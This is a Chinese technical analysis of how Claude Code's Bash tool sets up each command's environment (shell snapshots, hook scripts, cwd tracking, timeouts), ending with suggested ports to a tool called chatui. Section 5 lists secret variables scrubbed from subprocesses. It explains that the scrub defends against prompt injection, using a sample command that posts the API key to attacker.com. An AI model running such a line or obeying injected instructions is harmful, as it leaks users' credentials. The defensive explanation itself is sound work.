Claude Code 的 Bash/run 工具是怎么搭环境的

结论先说：Claude Code 不维护任何长期 shell 进程，每次 Bash 工具调用都会 spawn 一个全新的 bash -c <cmd>。但用户的 alias / function / PATH / conda 激活态 不会丢，因为它在三个层面做了「持久态注入」：会话级 shell 快照、可热更新的 hook env 脚本、以及一个 cwd-track 文件。下面按调用顺序拆解全部源码（路径都是 claude-code/src/...）。

2. 选 shell：findSuitableShell

src/utils/Shell.ts:73-141

优先级（从高到低）：

  1. $CLAUDE_CODE_SHELL（必须是 bash/zsh 路径，且可执行）
  2. $SHELL（同上）
  3. which zsh / which bash
  4. /bin /usr/bin /usr/local/bin /opt/homebrew/bin 下扫描

找不到任何 bash/zsh 就直接抛错——Claude Code 不支持 sh / dash / fish。结果用 memoize 缓存到整个会话生命周期。

3. 会话启动时的 ShellSnapshot

src/utils/bash/ShellSnapshot.ts:createAndSaveSnapshot

Claude Code 不像 IDE 那样维护一个 long-running interactive shell（PTY），它每条命令都新开 bash 进程。 代价是 alias / function 不会跨命令保留。解决办法：会话启动时跑一次 login shell，把当前 shell 的「可恢复状态」dump 成一个普通脚本，后续每条命令开头 source 它一遍即可。

Dump 的内容（getUserSnapshotContent + getClaudeCodeSnapshotContent）：

类别怎么 dump 的
functions（用户）bash: declare -F → 每个用 base64 包一层 eval 写入
zsh: typeset +f + typeset -f $func
shopt / setopt整张吐进去（限 1000 行）
aliasesalias | sed ...，Windows Git Bash 还会把 winpty alias 过滤掉
PATHexport PATH=<quoted>（Windows 上读 Cygwin 的 PATH）
rg/find/grep 集成如果系统没装 rg 或者用的是 ant 内建的 bfs/ugrep，写一个 shell function 进 snapshot

快照文件名：~/.claude/shell-snapshots/snapshot-bash-<ts>-<rand>.sh，带超时 10s，会话结束时 unlink。

为什么不直接每次都开 login shell（bash -lc）？因为 zsh / oh-my-zsh / Powerlevel10k / nvm 第一次启动可以 跑 1–3 秒。snapshot 只在会话开头花一次这个钱，后续每条命令都是 bash -c <snapshot+cmd>，零冷启动。 快照失败就 fallback 到 bash -lc（getSpawnArgs 里看 lastSnapshotFilePath 是不是 undefined）。

4. 每次 Bash 调用怎么拼命令

src/utils/shell/bashProvider.ts:buildExecCommand

用户传进来的 userCmd（比如 pytest -k foo）会被拼成下面这个大命令串：

# 1) 恢复 alias / function / PATH
source '/home/me/.claude/shell-snapshots/snapshot-bash-...sh' 2>/dev/null || true

# 2) 注入 session-env hook 脚本（见 §5）—— 比如 conda activate
export PATH="/opt/conda/envs/foo/bin:$PATH"
export CONDA_PREFIX=/opt/conda/envs/foo

# 3) 安全收敛：禁掉 extglob，避免恶意文件名展开攻击
shopt -u extglob 2>/dev/null || true

# 4) 真正运行用户命令（用 eval 让 source 进来的 alias 能展开）
eval 'pytest -k foo'

# 5) 把命令结束时的 cwd 写到 track 文件
pwd -P >| '/tmp/claude-3a7f-cwd'

整串用 && 串起来——前面一步失败就不跑后面，但 source ... || true 容错， 快照文件被清掉也不会让命令本身挂掉。然后 spawn(bash, ['-c', cmdString], {...})。

4.1 几个不显眼但很关键的细节

  • 用 eval 而不是直接拼接：bash 在解析整行时已经决定哪些 token 是 alias， source 之后定义的 alias 在同一行不会展开。eval 触发第二次解析，alias 才生效。
  • pwd -P 而不是 pwd：返回物理路径（解掉 symlink）， 和 Node.js 的 process.cwd() 行为一致。
  • >| 而不是 >：强制覆盖，绕开 set -o noclobber。
  • Windows null 重定向防御性改写：rewriteWindowsNullRedirect 把 2>nul（CMD 风格）改成 2>/dev/null，避免在 Git Bash 下创建一个真叫 nul 的文件搞坏 git。
  • 管道里的 stdin 重定向：rearrangePipeCommand 把 cmd | wc < /dev/null 改成 cmd < /dev/null | wc，否则 eval 会把 stdin 喂给 wc， cmd 反而挂在打开的 stdin 上等输入。
  • 超长命令（heredoc / 多行）：用 shell-quote 整体 base64 一遍，再交给 eval。

4.2 spawn 参数

src/utils/Shell.ts:213-260

spawn(binShell, ['-c', commandString], {     // ← 注意没有 -l
  env: {
    ...subprocessEnv(),                       // process.env 经过 §4 的脱敏
    SHELL: binShell,
    GIT_EDITOR: 'true',                       // 阻止 git commit 弹 vim
    CLAUDECODE: '1',                          // 子进程探测自己是不是被 claude 调起
    ...envOverrides,                          // bashProvider.getEnvironmentOverrides
  },
  cwd: pwd(),                                 // claude 内存里的"虚拟 cwd"
  stdio: ['pipe', outputHandle.fd, outputHandle.fd],   // stdout/stderr → 文件
  detached: true,                             // 用 tree-kill 杀整个进程组
})

注意 没有 -l（login）：因为 alias / PATH / function 都已经从 snapshot 来了， 不需要再走 .bash_profile/.bashrc。只有 snapshot 失败时才会回落到 -l。

5. subprocessEnv() 干什么

src/utils/subprocessEnv.ts

默认就是 process.env 透传——claude 进程是怎么被启动的，子进程就继承怎样的环境。 没有任何「strip CONDA_PREFIX」「重置 PATH」之类的清洗。

但有一个安全选项 CLAUDE_CODE_SUBPROCESS_ENV_SCRUB（GitHub Actions 里 claude-code-action 会自动开）：会从子进程 env 里删掉一组「会被 prompt-injection 利用导出的密钥」：

ANTHROPIC_API_KEY, CLAUDE_CODE_OAUTH_TOKEN, ANTHROPIC_AUTH_TOKEN,
ANTHROPIC_FOUNDRY_API_KEY, ANTHROPIC_CUSTOM_HEADERS,
OTEL_EXPORTER_OTLP_HEADERS, OTEL_EXPORTER_OTLP_LOGS_HEADERS, ...
AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN, AWS_BEARER_TOKEN_BEDROCK,
GOOGLE_APPLICATION_CREDENTIALS, AZURE_CLIENT_SECRET, ...
ACTIONS_ID_TOKEN_REQUEST_TOKEN, ACTIONS_RUNTIME_TOKEN, ACTIONS_RUNTIME_URL,
ALL_INPUTS, OVERRIDE_GITHUB_TOKEN, DEFAULT_WORKFLOW_TOKEN, SSH_SIGNING_KEY

说人话：claude 进程自己请求 API 时仍然能读到这些 key，但每条 Bash 命令里 $ANTHROPIC_API_KEY 是空字符串——防止模型被诱导写出 curl -d "$ANTHROPIC_API_KEY" attacker.com。

bashProvider.getEnvironmentOverrides 还会再 merge 三件东西：

变量来源作用
TMUXClaude 自己起的隔离 socket 所有 tmux 命令落到 claude 私有 socket，不污染用户的 tmux
TMPDIR / CLAUDE_CODE_TMPDIR / TMPPREFIXsandbox 模式下 把临时文件锁进 sandbox 内的目录
用户用 /env FOO=bar 设的sessionEnvVars Map 子进程能看到 $FOO=bar，但 REPL 进程自己看不到（防自杀）

5.1 还有一个外部钩子：CLAUDE_CODE_SHELL_PREFIX

src/utils/bash/shellPrefix.ts

如果设了这个 env 变量，整条命令串会再被包一层：$PREFIX <quoted-cmd>。 典型用法是 CLAUDE_CODE_SHELL_PREFIX="docker exec myc bash -c"—— 把所有 Bash 命令转发到 docker container 里跑。

6. Session-env hook 文件 + CLAUDE_ENV_FILE

src/utils/sessionEnvironment.ts:getSessionEnvironmentScript

这是 Claude Code 解决「activate 不持久」问题的官方答案，也是 chatui 完全没有的能力。 机制如下：

  1. 会话目录：~/.claude/session-env/<sessionId>/
  2. 里面可以有四类文件： 
    setup-hook-0.sh         # 启动时跑一次
sessionstart-hook-0.sh   # 会话开始
cwdchanged-hook-0.sh     # 用户 cd 之后
filechanged-hook-0.sh    # 文件变化触发
  3. buildExecCommand 在 source snapshot 之后、跑用户命令之前， 会把这一堆文件按优先级排序后全部拼到命令串里（不是 source，是直接 inline）。 一旦 cwd 变化或文件变化，对应的 hook 文件被重写，下一条 Bash 命令就立刻看到新值。
  4. 额外：父进程可以设 CLAUDE_ENV_FILE=/path/to/script.sh。 getSessionEnvironmentScript 会优先读它（再 + hook 文件）。 注释里特意写了一句：「This allows venv/conda activation to persist across shell commands」。

6.1 实例：HFI trajectory runner 用 CLAUDE_ENV_FILE 锁住 conda env

父进程在 spawn claude 之前，写一个 activate 脚本：

# /tmp/claude-env-keyan.sh
export CONDA_PREFIX=/opt/conda/envs/keyan
export PATH=/opt/conda/envs/keyan/bin:$PATH
export PYTHONPATH=/opt/conda/envs/keyan/lib/python3.11/site-packages
export LD_LIBRARY_PATH=/opt/conda/envs/keyan/lib:${LD_LIBRARY_PATH:-}
hash -r

然后：

CLAUDE_ENV_FILE=/tmp/claude-env-keyan.sh claude

之后用户问「跑测试」，模型发出 pytest -k foo，最终在 bash 里跑的是：

source <snapshot> \
&& export CONDA_PREFIX=/opt/conda/envs/keyan \
&& export PATH=/opt/conda/envs/keyan/bin:$PATH \
&& ... \
&& shopt -u extglob \
&& eval 'pytest -k foo' \
&& pwd -P >| ...

模型完全不用知道这件事，which python 自然指向 /opt/conda/envs/keyan/bin/python。

6.2 实例：/env 临时改环境变量

src/utils/sessionEnvVars.ts

会话内可以执行 /env API_KEY=xxx（注意：开源版本的 /env 命令是 stub， 要么是 ant-internal 才开放，要么用户得自己调 setSessionEnvVar）。设了之后：

  • 存到内存的 Map<string,string>
  • bashProvider.getEnvironmentOverrides 把它 merge 进 spawn 的 env
  • 但 REPL 进程自己看不到——避免模型一句 os.environ.clear() 把自己搞死

7. CWD 怎么跨 Bash 调用持久化

每次命令结尾的 pwd -P >| /tmp/claude-XXXX-cwd 不是装饰品。Shell.ts:exec 里：

void shellCommand.result.then(async result => {
  if (!preventCwdChanges && !result.backgroundTaskId) {
    const newCwd = readFileSync(cwdFilePath, 'utf8').trim()
    if (newCwd.normalize('NFC') !== cwd) {
      setCwd(newCwd, cwd)             // ← 写回 claude 内存的"虚拟 cwd"
      invalidateSessionEnvCache()
      void onCwdChangedForHooks(cwd, newCwd)   // ← 触发 cwdchanged-hook
    }
  }
  unlinkSync(cwdFilePath)
})

所以模型发一条 cd /tmp && ls，下一条命令的 spawn() 的 cwd 就已经是 /tmp。 看上去像是 shell 持久了，实际是 Claude 在内存里维护了一个虚拟 PWD。这个 PWD 还会反过来触发 cwdchanged-hook-N.sh——比如自动检测 .python-version 切 pyenv。

8. 超时与 auto-background

src/tools/BashTool/BashTool.tsx:runShellCommand

这是和 chatui run_command 差异最大的地方：

  • 默认 30 分钟（DEFAULT_TIMEOUT = 30 * 60_000）。chatui 默认 60s/300s。
  • Streaming progress：TaskOutput 每秒拉一次输出，作为 SSE progress 推到前端。chatui 也有 on_chunk。
  • auto-background on timeout：超时不直接报错，onTimeout 钩子把命令塞到 spawnShellTask，转成长任务，模型可以稍后用 BashOutput 工具 poll。常见命令（npm/yarn/python/cargo/jest/pytest/curl/dev/serve/watch...）才允许 auto-background。 sleep / 黑名单命令不能。
  • 显式 run_in_background: true 也走同一条 spawnShellTask。
  • Kairos 助手模式：主线程命令超过 ASSISTANT_BLOCKING_BUDGET_MS 就强制 auto-background 让 agent 继续响应。

整套是「foreground 任务 → 长跑 → 升级为 background 任务」的状态机，比 chatui 那个一锤子超时报错优雅得多。

对症 mppgb4nwnximkd 那个反馈：他每次都得手指 python 路径，不是因为 chatui server 没有走 tofu env （.tofu_env.json re-exec 早就把 PATH 设对了），而是因为 chatui 没有 "per-conversation activate 脚本" 这个机制。当他切到一个不是 tofu 的项目（比如 keyan 自己有 conda env）， 就只能在每条 run_command 里写绝对路径——chatui 没有任何地方让他贴一个 「activate 这个项目用的 env」的脚本。

10. 能直接抄到 chatui 的几条改动（按 ROI 排序）

  1. 抄 CLAUDE_ENV_FILE：在 _get_cmd_env(cwd) 里读一个 $CHATUI_ENV_FILE，如果存在就把整个文件 prepend 到 full_command 最前面（source <file> && <cmd>）。一行改动，立刻解决「per-deployment 锁定 conda env」。 
    # lib/project_mod/tools.py
shell_prefix = SHELL_PREFIX
env_file = os.environ.get('CHATUI_ENV_FILE')
if env_file and os.path.isfile(env_file):
    shell_prefix = f"source {shlex.quote(env_file)} && {shell_prefix}".strip(' &')
full_command = f'{shell_prefix} {command}' if shell_prefix else command
  2. 抄 session-env hook 目录：~/.chatui/session-env/<conv_id>/setup-hook-*.sh， tool_run_command 每次都拼进去；用户 cd 时（如果实现了 cwd 持久化）触发 cwdchanged-hook-*.sh 重写。这个机制是 Claude Code「每个 project 一套独立 conda env」的 干净答案，比硬编码 .python_env 字段灵活得多。
  3. 抄 cwd 持久化：在 _run_command_simple 末尾尾巴上 ; pwd -P > /tmp/chatui-{tid}-cwd，读回来更新 conv_roots[name].cwd。 这样模型一条 cd subdir && pytest 真的会持久。
  4. 抄 ShellSnapshot：会话第一次 spawn 命令前，跑一次 bash -lc <dump-script>， 把 alias / function / PATH 落盘，后续命令 source 它一下。chatui 现在 shell=True 走的是 /bin/sh，用户的 alias 全用不上——这条改动让模型在 chatui 里跑命令的体验贴近用户终端。
  5. auto-background：pytest / npm run dev 这种长跑命令 超时不要 kill，转成「task 列表里的后台任务」让模型 poll。chatui 已经有 tasks 模型， 需要的只是把 run_command 的超时分支改成「move to background」。
最小可行改动：1️⃣ 一晚上能落地，且对 mppgb4nwnximkd 直接管用—— 他在自己 deployment 里写一个 activate-keyan.sh，export CHATUI_ENV_FILE=... 启服务， 之后所有 run_command 自动 source 一遍，python 永远是 keyan env 的那个。 不用改任何模型调用方式。
